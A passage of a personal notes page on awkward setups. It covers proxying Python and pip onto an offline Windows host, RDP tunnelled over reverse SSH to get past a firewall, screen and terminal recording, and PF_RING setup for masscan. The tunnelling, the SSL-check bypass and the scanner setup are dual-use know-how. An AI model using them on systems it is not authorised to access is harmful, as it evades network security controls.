<span class="c"># using pacman unless they are outdated</span></code></pre></div></div></li> <li>I got stuck in some OpenSSL error due to missing libs (not available in pacman), try <a href="https://cryptography.io/en/latest/installation/#static-wheels">downloading/compiling them</a> next time and exporting the <code>OPENSSL_VERSION</code> variable</li> </ul> <h2 id="tricky-configuration--embedded-python-for-windows"> <a href="#tricky-configuration--embedded-python-for-windows" class="anchor-heading" aria-labelledby="tricky-configuration--embedded-python-for-windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Embedded Python for Windows </h2> <ul> <li>If the machine doesn&#8217;t have internet, create a socks connection with <code>plink -D</code></li> <li>Make the OS use the socks proxy through the Internet Explorer LAN Configuration settings by only setting the Socks server option to 127.0.0.1 &lt;port&gt;</li> <li>Send <a href="https://docs.python.org/using/windows.html#embedding-python">embedded python</a> (since <a href="https://docs.python.org/3.5/using/windows.html#embedded-distribution">3.5</a> - <a href="https://pythondev.readthedocs.io/platforms.html">Windows Vista minimum</a>): <a href="https://www.python.org/downloads/windows/">download</a> - and <a href="https://github.com/shunf4/proxychains-windows/releases">proxychains</a></li> <li>Change the last line of the proxychains configuration to use the local socks server and port like the IE setting</li> <li>Send <a href="https://pip.pypa.io/en/stable/installing/">pip</a> by first downloading it to your machine and then sending it to the Windows one</li> <li>Install pip by setting the trusted flags to bypass the <a href="https://www.listendata.com/2019/04/connection-error-ssl-certificate-failed.html">SSL errors</a>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">proxychains_win32_x86</span><span class="err">.exe</span> <span class="na">-f </span><span class="kd">proxychains</span>.conf .\python.exe <span class="kd">get</span><span class="na">-pip</span>.py <span class="na">--trusted-host </span><span class="kd">pypi</span>.org <span class="na">--trusted-host </span><span class="kd">files</span>.pythonhosted.org</code></pre></div></div></li> <li>Uncomment the <code>import site</code> in the <code>python&lt;ver&gt;._nth</code> file as mentioned <a href="https://stackoverflow.com/a/48906746">here</a></li> <li>Then find <code>pip</code> in the Scripts folder but run it like:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">proxychains_win32_x86</span><span class="err">.exe</span> <span class="na">-f </span><span class="kd">proxychains</span>.conf .\python.exe <span class="na">-m </span><span class="kd">pip</span> <span class="na">--trusted-host </span><span class="kd">pypi</span>.org <span class="na">--trusted-host </span><span class="kd">files</span>.pythonhosted.org <span class="kd">install</span> <span class="o">&lt;</span><span class="kd">package</span><span class="o">&gt;</span>
<span class="c">:: pipenv won't work with embeddable</span>
<span class="c">:: https://github.com/pypa/pipenv/issues/4334#issuecomment-694715392</span></code></pre></div></div></li> <li>Note that some debugging programs that import python libraries (like <a href="https://cx-freeze.readthedocs.io/en/latest/script.html">cxfreeze</a>) won&#8217;t work with embeddable python due to the fact that most of these libraries are inside the <code>python&lt;ver&gt;.zip</code>, you may try to decompress it and place the libraries in the Lib folder</li> <li>It is worth mentioning that some packages may perfectly work if these libraries are removed from the import, for example <a href="https://github.com/msuhanov/yarp">yarp</a> (<code>autoripy</code> dependency), which goes along if <code>__version__</code> is removed (though you won&#8217;t be able to install it via the remote archive as this modification is needed)</li> <li>But problems will exist for packages that depends on Microsoft Visual C++/SDK</li> </ul> <h2 id="tricky-configuration--vnc"> <a href="#tricky-configuration--vnc" class="anchor-heading" aria-labelledby="tricky-configuration--vnc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> VNC </h2> <ul> <li>The only Linux client that allows scaling to become usable in a HiDPI screen is <a href="https://github.com/GNOME/vinagre">Vinagre</a></li> </ul> <h2 id="tricky-configuration--rdp---remote-desktop"> <a href="#tricky-configuration--rdp---remote-desktop" class="anchor-heading" aria-labelledby="tricky-configuration--rdp---remote-desktop"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RDP - Remote Desktop </h2> <h3 id="tricky-configuration--rdp---remote-desktop--enable"> <a href="#tricky-configuration--rdp---remote-desktop--enable" class="anchor-heading" aria-labelledby="tricky-configuration--rdp---remote-desktop--enable"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enable </h3> <ul> <li>Remote Desktop can only be enabled if the network currently connected is set as <code>Private</code></li> <li>Enable it via PS (<a href="https://www.alphr.com/how-to-change-a-wi-fi-network-from-public-to-private-in-windows-10/">source</a>):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Open the shell as Admin</span>

<span class="c">:: Get the name of the current net</span>
<span class="kd">Get</span><span class="na">-NetConnectionProfile

</span><span class="c">:: Set is as Private</span>
<span class="kd">Set</span><span class="na">-NetConnectionProfile -Name </span><span class="s2">"&lt;NetName&gt;"</span> <span class="na">-NetworkCategory </span><span class="kd">Private</span></code></pre></div></div></li> </ul> <h3 id="tricky-configuration--rdp---remote-desktop--rdp-over-reverse-ssh"> <a href="#tricky-configuration--rdp---remote-desktop--rdp-over-reverse-ssh" class="anchor-heading" aria-labelledby="tricky-configuration--rdp---remote-desktop--rdp-over-reverse-ssh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RDP over Reverse SSH </h3> <ul> <li>Useful when there&#8217;s a firewall that is not allowing inbound connections for RDP</li> <li>Note that the following assumes that the <code>ssh</code> client tool is already installed on the firewalled machine</li> <li>First, create a SSH server on your machine (use <a href="https://github.com/ginuerzh/gost">gost</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Non-std ssh port for extra security</span>
gost <span class="nt">-L</span> forward+ssh://:2222</code></pre></div></div></li> <li>Use <code>ssh</code> in reverse tunnel mode:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Daemonize with -f once it works</span>
 ssh <span class="nt">-N</span> <span class="nt">-R</span> 127.0.0.1:3389:127.0.0.1:3389 <span class="nt">-p</span> 2222 &lt;server-ip&gt;
<span class="c"># Disable compression</span>
<span class="nt">-o</span> <span class="nv">Compression</span><span class="o">=</span>no
<span class="c"># Enable compression</span>
<span class="nt">-C</span></code></pre></div></div></li> </ul> <h3 id="tricky-configuration--rdp---remote-desktop--connect-with-xfreerdp"> <a href="#tricky-configuration--rdp---remote-desktop--connect-with-xfreerdp" class="anchor-heading" aria-labelledby="tricky-configuration--rdp---remote-desktop--connect-with-xfreerdp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Connect with XFreeRDP </h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Ctrl+Alt+Enter - Toggle fullscreen</span>

<span class="c"># If RDP8 proto is not available</span>
<span class="c"># use /rfx /codec-cache:rfx</span>
xfreerdp /log-level:FATAL /network:lan /dynamic-resolution <span class="nt">-decorations</span> <span class="nt">-themes</span> /gfx /codec-cache:gfx +gfx-small-cache +glyph-cache /sound /u:<span class="s1">'&lt;DOMAIN&gt;\&lt;user&gt;'</span> /v:127.0.0.1:3389 +auto-reconnect +bitmap-cache +multitransport +window-drag
<span class="c"># /mic - Enable the microphone</span>

<span class="c"># Scale for HiDPI display</span>
xfreerdp /log-level:FATAL /network:lan /scale:180 /scale-desktop:280 /scale-device:180 /dynamic-resolution <span class="nt">-decorations</span> <span class="nt">-themes</span> /gfx /codec-cache:gfx +gfx-small-cache +glyph-cache /sound /u:<span class="s1">'&lt;DOMAIN&gt;\&lt;user&gt;'</span> /v:127.0.0.1:3389 +auto-reconnect +bitmap-cache +multitransport +window-drag
<span class="c"># There are some flags to redirect the</span>
<span class="c"># local USBs and microphones</span></code></pre></div></div> <h2 id="tricky-configuration--record-screen"> <a href="#tricky-configuration--record-screen" class="anchor-heading" aria-labelledby="tricky-configuration--record-screen"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Record Screen </h2> <h3 id="tricky-configuration--record-screen--integrated-gpu"> <a href="#tricky-configuration--record-screen--integrated-gpu" class="anchor-heading" aria-labelledby="tricky-configuration--record-screen--integrated-gpu"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Integrated GPU </h3> <ul> <li>Note that frames will be lost if other high-computational processes (such as virtual machines) are using the CPU</li> <li>Either preset <code>veryfast</code> with crf 38</li> <li>Or preset <code>superfast</code> with crf 40</li> <li>Consider adding <code>-video_size &lt;geometry&gt;</code></li> <li>Try increasing the <code>-probesize</code> in case some magic happens</li> <li>Full command:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffmpeg <span class="nt">-hide_banner</span> <span class="nt">-loglevel</span> warning <span class="nt">-hwaccel</span> auto <span class="nt">-probesize</span> 100M <span class="nt">-draw_mouse</span> 0 <span class="nt">-f</span> x11grab <span class="nt">-i</span> :0.0 <span class="nt">-an</span> <span class="nt">-c</span>:v libx264rgb <span class="nt">-crf</span> 40 <span class="nt">-preset</span> superfast <span class="nt">-tune</span> stillimage <span class="nt">-threads</span> 0 &lt;file.mkv&gt;</code></pre></div></div></li> </ul> <h3 id="tricky-configuration--record-screen--discrete-gpu"> <a href="#tricky-configuration--record-screen--discrete-gpu" class="anchor-heading" aria-labelledby="tricky-configuration--record-screen--discrete-gpu"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Discrete GPU </h3> <ul> <li>Doesn&#8217;t have the problem of the missing frames, though <code>hashcat</code> and other GPGPU tools will create issues</li> <li><code>pvkrun</code> may not be necessary or could be replaced with <code>primusrun</code></li> <li>Full command:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">vblank_mode</span><span class="o">=</span>0 optirun <span class="nt">--no-xorg</span> <span class="nt">-b</span> none <span class="nt">--</span> pvkrun ffmpeg <span class="nt">-hide_banner</span> <span class="nt">-loglevel</span> warning <span class="nt">-threads</span>:v 2 <span class="nt">-filter_threads</span> 2 <span class="nt">-thread_queue_size</span> 4096 <span class="nt">-vsync</span> 0 <span class="nt">-hwaccel</span> cuvid <span class="nt">-hwaccel_output_format</span> cuda <span class="nt">-probesize</span> 100M <span class="nt">-draw_mouse</span> 0 <span class="nt">-f</span> x11grab <span class="nt">-i</span> :0.0 <span class="nt">-an</span> <span class="nt">-c</span>:v h264_nvenc <span class="nt">-rc</span> vbr <span class="nt">-spatial-aq</span> 1 <span class="nt">-temporal-aq</span> 1 <span class="nt">-qmin</span> 34 <span class="nt">-qmax</span> 51 <span class="nt">-bufsize</span>:v 32M <span class="nt">-rc-lookahead</span>:v 75 <span class="nt">-b_adapt</span> 0 <span class="nt">-coder</span> auto <span class="nt">-tune</span> hq <span class="s2">"&lt;file&gt;-</span><span class="si">$(</span><span class="nb">date</span> <span class="s1">'+%s'</span><span class="si">)</span><span class="s2">.mkv"</span></code></pre></div></div></li> </ul> <h2 id="tricky-configuration--record-terminal"> <a href="#tricky-configuration--record-terminal" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Record Terminal </h2> <h3 id="tricky-configuration--record-terminal--extra"> <a href="#tricky-configuration--record-terminal--extra" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--extra"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Extra </h3> <h4 id="tricky-configuration--record-terminal--extra--compression"> <a href="#tricky-configuration--record-terminal--extra--compression" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--extra--compression"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Compression </h4> <ul> <li>Create pipes to <code>zstd</code>, example:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using zsh/bash pipes</span>
<span class="c"># script - record</span>
script <span class="nt">-q</span> <span class="nt">-t</span> <span class="o">&gt;(</span>zstd <span class="nt">-q</span> <span class="nt">-T0</span> <span class="nt">--ultra</span> <span class="nt">--long</span> <span class="nt">--adapt</span><span class="o">=</span><span class="nv">min</span><span class="o">=</span>1,max<span class="o">=</span>22 <span class="nt">-o</span> timings.zst<span class="o">)</span> <span class="o">&gt;(</span>zstd <span class="nt">-q</span> <span class="nt">-T0</span> <span class="nt">--ultra</span> <span class="nt">--long</span> <span class="nt">--adapt</span><span class="o">=</span><span class="nv">min</span><span class="o">=</span>1,max<span class="o">=</span>22 <span class="nt">-o</span> rawout.zst<span class="o">)</span>

<span class="c"># script - playback</span>
scriptreplay <span class="nt">-t</span> &lt;<span class="o">(</span>zstdcat timings.zst<span class="o">)</span> &lt;<span class="o">(</span>zstdcat rawout.zst<span class="o">)</span>

<span class="c"># ttyrec - record</span>
ttyrec <span class="nt">-f</span> <span class="o">&gt;(</span>zstd <span class="nt">-q</span> <span class="nt">-T0</span> <span class="nt">--ultra</span> <span class="nt">--long</span> <span class="nt">--adapt</span><span class="o">=</span><span class="nv">min</span><span class="o">=</span>1,max<span class="o">=</span>22 <span class="nt">-o</span> record.zst<span class="o">)</span>

<span class="c"># ipbt - playback</span>
ipbt <span class="nt">-u</span> <span class="nt">-U</span> <span class="nt">-A</span> <span class="nt">-P</span> <span class="nt">-T</span> &lt;<span class="o">(</span>zstdcat record.zst<span class="o">)</span></code></pre></div></div></li> </ul> <h4 id="tricky-configuration--record-terminal--extra--clean-vt100-ansi-escapes"> <a href="#tricky-configuration--record-terminal--extra--clean-vt100-ansi-escapes" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--extra--clean-vt100-ansi-escapes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Clean VT100/ANSI escapes </h4> <ul> <li>Use <code>sed</code> <a href="https://stackoverflow.com/a/51141872">magic-regex</a> - still needs to trim some vterm/tmux/screen escapes</li> <li>Use <a href="https://github.com/pixelb/scripts/blob/master/scripts/ansi2html.sh">ansi2html.sh</a> (<a href="https://github.com/pixelb/scripts/raw/master/scripts/ansi2html.sh">raw</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># TODO - sed magic needed to further</span>
<span class="c"># trim  + vterm/tmux/screen escape</span>
zstdcat rawout.zst | ansi2html.sh | w3m <span class="nt">-T</span> text/html <span class="nt">-dump</span> | less <span class="nt">-r</span></code></pre></div></div></li> </ul> <h3 id="tricky-configuration--record-terminal--script"> <a href="#tricky-configuration--record-terminal--script" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--script"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Script </h3> <ul> <li>Record:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use -c for running a command</span>
<span class="c"># Use -a for appending to files</span>
script <span class="nt">-q</span> <span class="nt">-t</span> timings.ty rawout.ty</code></pre></div></div></li> <li>Playback:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># No rewind support</span>
scriptreplay <span class="nt">-t</span> timings.ty rawout.ty

<span class="c"># Join inactivity on same-frame - zsh</span>
scriptreplay <span class="nt">-t</span> &lt;<span class="o">(</span><span class="nb">awk</span> <span class="s1">'{ printf "%f %d\n", (($1 - last) &gt; 1) ? 1 : $1, $2 }'</span> timings.ty<span class="o">)</span> rawout.ty</code></pre></div></div></li> <li>Run the recorded commands:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The recorded cmds will be executed</span>
scriptlive <span class="nt">-t</span> timings.ty rawout.ty</code></pre></div></div></li> </ul> <h3 id="tricky-configuration--record-terminal--ttyrec"> <a href="#tricky-configuration--record-terminal--ttyrec" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--ttyrec"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> TTYrec </h3> <ul> <li>Use <a href="https://github.com/ovh/ovh-ttyrec">ovh-ttyrec</a> (or <a href="http://0xcc.net/ttyrec/">ttyrec</a> + <a href="https://sources.debian.org/patches/ttyrec">patches</a>)</li> <li>Record (using <code>ovh-ttyrec</code> syntax):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ttyrec <span class="nt">-f</span> record.trec

<span class="c"># Record just a command</span>
ttyrec <span class="nt">-f</span> record.trec <span class="nt">--</span> &lt;cmd&gt;</code></pre></div></div></li> <li>Playback:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># No rewind support</span>
ttyplay record.trec</code></pre></div></div></li> <li>Dump the recording in raw format:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ttyplay <span class="nt">-n</span> record.trec <span class="o">&gt;</span> rawout.ty</code></pre></div></div></li> <li>Repair corrupted ttyrec for IPBT:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Press + to duplicate the speed</span>
ttyrec <span class="nt">-f</span> &lt;fixed&gt; <span class="nt">--</span> ttyplay &lt;broken&gt;
<span class="c"># Play it in ipbt with &lt;num&gt;X</span></code></pre></div></div></li> </ul> <h3 id="tricky-configuration--record-terminal--ttyrec---perl"> <a href="#tricky-configuration--record-terminal--ttyrec---perl" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--ttyrec---perl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> TTYrec - Perl </h3> <ul> <li>Obtain it from <a href="https://metacpan.org/release/App-Ttyrec">App::Ttyrec</a></li> </ul> <h3 id="tricky-configuration--record-terminal--termrec"> <a href="#tricky-configuration--record-terminal--termrec" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--termrec"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Termrec </h3> <ul> <li><a href="https://github.com/kilobyte/termrec">termrec</a> - Records in ttyrec format with extra information for better playback - untested</li> </ul> <h3 id="tricky-configuration--record-terminal--ipbt---replayer"> <a href="#tricky-configuration--record-terminal--ipbt---replayer" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--ipbt---replayer"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> IPBT - Replayer </h3> <ul> <li><a href="https://git.tartarus.org/?p=simon/ipbt.git">Git</a> - <a href="https://www.chiark.greenend.org.uk/~sgtatham/ipbt/ipbt.html">Manual</a></li> <li>Some <code>ncurses</code> tools <a href="https://www.chiark.greenend.org.uk/~sgtatham/ipbt/ipbt.html#BUGS">won&#8217;t be displayed</a></li> <li>Replay TTYrec:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># --utf8-linedraw - Fix line drawings</span>
ipbt <span class="nt">-u</span> <span class="nt">-U</span> <span class="nt">-A</span> <span class="nt">-T</span> record.trec
<span class="c"># -f &lt;frame&gt; -&gt; Start at &lt;frame&gt;</span>

<span class="c"># Raw recordings</span>
ipbt <span class="nt">-u</span> <span class="nt">-U</span> <span class="nt">-A</span> <span class="nt">-R</span> rawout.ty

<span class="c"># o    -&gt; Frame info</span>
<span class="c"># l    -&gt; Speedup idle periods</span>
<span class="c"># s/p  -&gt; Pause/Play</span>
<span class="c"># SPC  -&gt; Next Frame     - Number mod</span>
<span class="c"># b    -&gt; Previous Frame - Number mod</span>
<span class="c"># &lt;n&gt;g -&gt; Jump to &lt;n&gt;  frame</span>
<span class="c"># G    -&gt; Jump to last frame</span>
<span class="c"># &lt;n&gt;x -&gt; Speedup  playback &lt;n&gt; times</span>
<span class="c"># &lt;n&gt;X -&gt; Slowdown playback &lt;n&gt; times</span>
<span class="c"># /    -&gt; Search forward</span>
<span class="c"># ?    -&gt; Search backward</span>
<span class="c"># n    -&gt; Repeat search</span></code></pre></div></div></li> </ul> <h3 id="tricky-configuration--record-terminal--asciinema"> <a href="#tricky-configuration--record-terminal--asciinema" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--asciinema"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> asciinema </h3> <ul> <li><a href="https://github.com/asciinema/asciinema">asciinema</a> - Creates JSON recordings</li> <li>Only useful if the purpose is to upload/share the recording</li> <li>Check <a href="https://github.com/krpors/ttyasc">ttyrec to asciinema</a> converters</li> <li><a href="https://github.com/cirocosta/asciinema-edit">Post-processing</a> - <a href="https://mullikine.github.io/posts/converting-between-ttyrec-formats/">format conversion</a></li> </ul> <h3 id="tricky-configuration--record-terminal--conversion---ttyrec----script"> <a href="#tricky-configuration--record-terminal--conversion---ttyrec----script" class="anchor-heading" aria-labelledby="tricky-configuration--record-terminal--conversion---ttyrec----script"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Conversion - ttyrec &lt;&gt; script </h3> <ul> <li>The following trick can be used but not time-efficient:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ttyrec <span class="nt">-f</span> record.trec <span class="nt">--</span> scriptreplay <span class="nt">-t</span> timings.ty rawout.ty</code></pre></div></div></li> </ul> <h2 id="tricky-configuration--screenshot-full-command-output"> <a href="#tricky-configuration--screenshot-full-command-output" class="anchor-heading" aria-labelledby="tricky-configuration--screenshot-full-command-output"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Screenshot Full Command Output </h2> <ul> <li><b>Before</b> running the command start <code>script</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># DO NOT add the -t &lt;tm&gt; flag</span>
<span class="nv">LC_ALL</span><span class="o">=</span>C script <span class="nt">-q</span> rawout.ty
<span class="c"># -c &lt;cmd&gt; - Run just the command</span>
<span class="c"># ^ The prompt won't be captured</span>

<span class="c"># Or use the following for compression</span>
script <span class="nt">-q</span> <span class="o">&gt;(</span>zstd <span class="nt">-q</span> <span class="nt">-T0</span> <span class="nt">--ultra</span> <span class="nt">--long</span> <span class="nt">--adapt</span><span class="o">=</span><span class="nv">min</span><span class="o">=</span>1,max<span class="o">=</span>22 <span class="nt">-o</span> rawout.zst<span class="o">)</span></code></pre></div></div></li> <li>Run the command <b>and</b> exit <code>script</code></li> <li>Use <a href="https://github.com/pixelb/scripts/raw/master/scripts/ansi2html.sh">ansi2html</a> to create an HTML:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The xterm palette is the clearest</span>
&lt; rawout.ty sh ansi2html.sh <span class="nt">--bg</span><span class="o">=</span>dark <span class="nt">--palette</span><span class="o">=</span>xterm <span class="o">&gt;</span> cmd.html

<span class="c"># Or if compression was used</span>
zstdcat rawout.zst | sh ansi2html.sh <span class="nt">--bg</span><span class="o">=</span>dark <span class="nt">--palette</span><span class="o">=</span>xterm <span class="o">&gt;</span> cmd.html</code></pre></div></div></li> <li>Remove the <code>script</code> tags from the HTML:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># TODO See if still relevant</span>
<span class="c"># Keeping the command prompt</span>
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'/Script started/{N;s/.*\n//p;N;g;:a;g;N;/Script done/!{s,^\n\(&lt;/span&gt;\)\+,,;P;s,[^\n]*\n,,;ba};d}'</span> cmd.html
<span class="c"># Works for multiple prompts</span>
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">':a;/\(^\|\n\)&lt;span[^\n]*&lt;[^&lt;]\+&gt;\s\?[%#]\s\+$\|\n$/{N;ba};s/.*\n\+//;/^Script \(started\|done\)/d'</span> cmd.html

<span class="c"># TODO See if still relevant</span>
<span class="c"># Keeping the command, not the prompt</span>
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'/Script started/{N;s/.*\n&lt;span.*\(&lt;[^&lt;]\+&gt;\) \?%/\1$/p;g;N;:a;N;/Script done/!{s,^\n\(&lt;/span&gt;\)\+,,;P;s,[^\n]*\n,,;ba};d}'</span> cmd.html
<span class="c"># Works for multiple prompts</span>
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">':a;/\(^\|\n\)&lt;span[^\n]*&lt;[^&lt;]\+&gt;\s\?[%#]\s[^&lt;\n]\+$\|\n\s*$/{N;ba};/Script \(started\|done\)/d;s/^\(&lt;span.*&lt;[^&lt;]\+&gt;\s\?[%#]\s.*[^\n]\+\)\?\(\n*\)&lt;span.*\(&lt;[^&lt;]\+&gt;\)\s\?\([%#]\)\s*/\2\3\4 /'</span> cmd.html
<span class="c"># ^ Assuming % or # as prompt separator</span>

<span class="c"># TODO See if still relevant</span>
<span class="c"># Only the command's output</span>
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'/Script started/{N;g;N;:a;g;N;/Script done/!{s,^\n\(&lt;/span&gt;\)\+,,;P;s,[^\n]*\n,,;ba};d}'</span> cmd.html
<span class="c"># Works for multiple prompts</span>
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">':a;/\(^\|\n\)&lt;span[^\n]*&lt;[^&lt;]\+&gt;\s\?[%#]\s[^&lt;\n]\+$\|\n\s*$/{N;ba};/^\(&lt;span[^\n]*&lt;[^&lt;]\+&gt;\s\?[%#]\s.\+$\|Script \(started\|done\)\)/d'</span> cmd.html</code></pre></div></div></li> <li>Use <a href="https://github.com/sindresorhus/capture-website-cli">capture-website</a> to generate the img:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Auto-crop full-page with --height=1</span>
capture-website <span class="nt">--height</span><span class="o">=</span>1 <span class="nt">--full-page</span> <span class="nt">--overwrite</span> <span class="nt">--output</span><span class="o">=</span>cmd.png cmd.html
<span class="c"># 'Unable to capture screenshot' means</span>
<span class="c"># that the height is above 10000000px</span>
<span class="c"># This is a Chrome limitation</span>

<span class="c"># Use --inset to workaround the issue</span>
capture-website <span class="nt">--height</span><span class="o">=</span>30000 <span class="nt">--inset</span><span class="o">=</span>20000,0,0,0 <span class="nt">--overwrite</span> cmd.html
<span class="c"># ^ 10000 pixels from 20000y-px</span>
<span class="c"># TODO Join all the images for full-out</span>

<span class="c"># TODO Crop Script tags with --inset</span></code></pre></div></div></li> </ul> <h2 id="tricky-configuration--ffplay-scale-realtime-input"> <a href="#tricky-configuration--ffplay-scale-realtime-input" class="anchor-heading" aria-labelledby="tricky-configuration--ffplay-scale-realtime-input"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> FFplay Scale Realtime Input </h2> <ul> <li>Assuming input signal of 1920x1080 and scaling to 3840x2160 (auto):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">vblank_mode</span><span class="o">=</span>0 ffplay <span class="nt">-video_size</span> 1920x1080 <span class="nt">-fast</span> <span class="nt">-an</span> <span class="nt">-infbuf</span> <span class="nt">-sync</span> audio <span class="nt">-framedrop</span> <span class="nt">-drp</span> 0 <span class="nt">-vf</span> <span class="s1">'scale=3840:-1'</span> <span class="nt">-loglevel</span> <span class="nt">-8</span> <span class="nt">-fs</span> /dev/video1</code></pre></div></div></li> </ul> <h2 id="tricky-configuration--ntop-pf_ring--for-masscan-"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan-" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan-"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> NTop PF_RING (for Masscan) </h2> <h3 id="tricky-configuration--ntop-pf_ring--for-masscan---requirements"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---requirements" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---requirements"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Requirements </h3> <ul> <li>The <a href="https://www.ntop.org/guides/pf_ring/zc.html#supported-cards">Zero Copy drivers</a> for the adapters only replace those that use PCIe (<a href="https://github.com/ntop/PF_RING/tree/dev/drivers/intel">supported</a>), so first check if your ethernet adapter uses PCI-express with <code>lspci | grep -i ethernet</code>, then check that the module currently used by the kernel is the same as the ones from the supported cards, ie, an Intel 8254x should be using <code>e1000e</code>: <code>lsmod | grep e1000e</code></li> <li>Note that <code>e1000</code> and <code>e1000e</code> are not the same, make sure that the kernel is currently using <code>e1000e</code> (or can be instructed to use it) before proceeding</li> </ul> <h3 id="tricky-configuration--ntop-pf_ring--for-masscan---pre-made-packages"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---pre-made-packages" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---pre-made-packages"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Pre-made packages </h3> <ul> <li>Some Debian distros have pkgs pre-made</li> </ul> <h3 id="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Installing from source </h3> <h4 id="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Kali Linux </h4> <h5 id="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--dependencies-"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--dependencies-" class="anchor-heading" 